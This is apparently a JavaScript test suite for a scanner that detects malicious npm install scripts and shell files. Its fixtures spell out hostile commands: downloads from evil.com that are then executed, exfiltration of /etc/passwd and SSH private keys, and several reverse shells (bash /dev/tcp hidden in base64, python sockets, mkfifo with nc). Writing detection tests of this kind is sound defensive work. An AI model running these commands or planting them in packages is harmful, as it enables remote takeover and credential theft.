const fs = require('fs');
const os = require('os');
const path = require('path');
const { test, asyncTest, assert, assertIncludes, runScan, runScanDirect, cleanupTemp, TESTS_DIR } = require('../test-utils');

function makeTempPkg(content, fileName = 'package.json') {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
  const pkg = {
    name: 'test-shell',
    version: '1.0.0',
    scripts: {}
  };
  if (fileName === 'package.json') {
    const parsed = typeof content === 'string' ? { scripts: { preinstall: content } } : content;
    Object.assign(pkg, parsed);
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify(pkg));
  } else {
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify(pkg));
    fs.writeFileSync(path.join(tmp, fileName), content);
  }
  return tmp;
}

async function runShellTests() {
  console.log('\n=== SHELL TESTS ===\n');

  test('SHELL: Detects curl | sh', () => {
    const output = runScan(path.join(TESTS_DIR, 'shell'));
    assertIncludes(output, 'curl', 'Should detect curl | sh');
  });

  test('SHELL: Detects wget && chmod +x', () => {
    const output = runScan(path.join(TESTS_DIR, 'shell'));
    assertIncludes(output, 'wget', 'Should detect wget');
  });

  test('SHELL: Detects reverse shell', () => {
    const output = runScan(path.join(TESTS_DIR, 'shell'));
    assertIncludes(output, 'reverse', 'Should detect reverse shell');
  });

  test('SHELL: Detects rm -rf $HOME', () => {
    const output = runScan(path.join(TESTS_DIR, 'shell'));
    assertIncludes(output, 'home', 'Should detect home deletion');
  });

  // --- v2.5.13: Expanded shell detection tests ---

  await asyncTest('SHELL: Detects two-stage wget + exec in preinstall', async () => {
    const tmp = makeTempPkg({ scripts: { preinstall: 'wget http://evil.com/payload -O /tmp/p && chmod +x /tmp/p && /tmp/p' } });
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'lifecycle_script' || t.type === 'lifecycle_shell_pipe');
      assert(t, 'Should detect lifecycle script with wget + chmod + exec');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL: Detects curl POST exfiltration in postinstall', async () => {
    const tmp = makeTempPkg({ scripts: { postinstall: 'curl -X POST -d @/etc/passwd http://evil.com/exfil' } });
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'lifecycle_script' || t.type === 'lifecycle_shell_pipe');
      assert(t, 'Should detect lifecycle script with curl POST exfiltration');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL: Detects base64 pipe to bash', async () => {
    const tmp = makeTempPkg({ scripts: { preinstall: 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDMgMD4mMQ== | base64 -d | bash' } });
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.message && (t.message.includes('base64') || t.message.includes('bash') || t.message.includes('pipe')));
      assert(t, 'Should detect base64 decode piped to bash');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL: Detects python reverse shell in preinstall', async () => {
    const tmp = makeTempPkg({ scripts: { preinstall: 'python -c "import socket,subprocess;s=socket.socket();s.connect((\'10.0.0.1\',4444));subprocess.call([\'/bin/sh\',\'-i\'],stdin=s.fileno(),stdout=s.fileno())"' } });
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'lifecycle_script' || t.type === 'lifecycle_shell_pipe');
      assert(t, 'Should detect lifecycle script with python reverse shell');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL: Detects SSH key exfiltration', async () => {
    const tmp = makeTempPkg({ scripts: { postinstall: 'curl -F "file=@$HOME/.ssh/id_rsa" http://evil.com/upload' } });
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'lifecycle_script' || t.type === 'lifecycle_shell_pipe');
      assert(t, 'Should detect lifecycle script with SSH key exfiltration');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL: Safe npm script (no pipe, no evil) → no shell threat', async () => {
    const tmp = makeTempPkg({ scripts: { build: 'tsc && node build.js', test: 'jest --coverage' } });
    try {
      const result = await runScanDirect(tmp);
      const shellThreats = (result.threats || []).filter(t =>
        t.type === 'lifecycle_shell_pipe' || t.type === 'reverse_shell'
      );
      assert(shellThreats.length === 0, 'Safe npm scripts should not trigger shell threats');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL: curl without pipe in postinstall → not lifecycle_shell_pipe', async () => {
    const tmp = makeTempPkg({ scripts: { postinstall: 'curl http://example.com/api/status' } });
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'lifecycle_shell_pipe');
      assert(!t, 'curl without pipe should NOT be lifecycle_shell_pipe');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL: Detects env var wrapper for curl|sh', async () => {
    const tmp = makeTempPkg({ scripts: { preinstall: 'CMD="curl http://evil.com/s.sh | sh" && eval $CMD' } });
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.message && (t.message.includes('curl') || t.message.includes('eval')));
      assert(t, 'Should detect env var wrapped curl|sh');
    } finally { cleanupTemp(tmp); }
  });

  // =============================================
  // v2.5.14: B14/B15 — New shell patterns
  // =============================================

  await asyncTest('SHELL B14: mkfifo + nc reverse shell — detected', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
    fs.writeFileSync(path.join(tmp, 'exploit.sh'), 'mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f');
    try {
      const result = await runScanDirect(tmp);
      const t = (result.threats || []).find(t => t.type === 'fifo_nc_reverse_shell');
      assert(t, 'mkfifo + nc pattern should be detected as fifo_nc_reverse_shell');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL B15: base64 -d | bash — detected', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
    fs.writeFileSync(path.join(tmp, 'exploit.sh'), 'echo "Y3VybCBodHRwOi8vZXZpbC5jb20vcy5zaA==" | base64 -d | bash');
    try {
      const result = await runScanDirect(tmp);
      const t = (result.threats || []).find(t => t.type === 'base64_decode_exec');
      assert(t, 'base64 -d | bash should be detected as base64_decode_exec');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL B15: wget + base64 -d two-stage — detected', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
    fs.writeFileSync(path.join(tmp, 'exploit.sh'), 'wget http://evil.com/payload.b64 -O /tmp/p.b64 && base64 -d /tmp/p.b64 > /tmp/p && chmod +x /tmp/p');
    try {
      const result = await runScanDirect(tmp);
      const t = (result.threats || []).find(t => t.type === 'wget_base64_decode');
      assert(t, 'wget + base64 -d should be detected as wget_base64_decode');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL B15 negative: base64 -d without pipe to bash — NOT detected', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
    fs.writeFileSync(path.join(tmp, 'safe.sh'), 'base64 -d cert.pem.b64 > cert.pem');
    try {
      const result = await runScanDirect(tmp);
      const t = (result.threats || []).find(t => t.type === 'base64_decode_exec');
      assert(!t, 'base64 -d without pipe to bash should NOT be detected');
    } finally { cleanupTemp(tmp); }
  });
}

module.exports = { runShellTests };
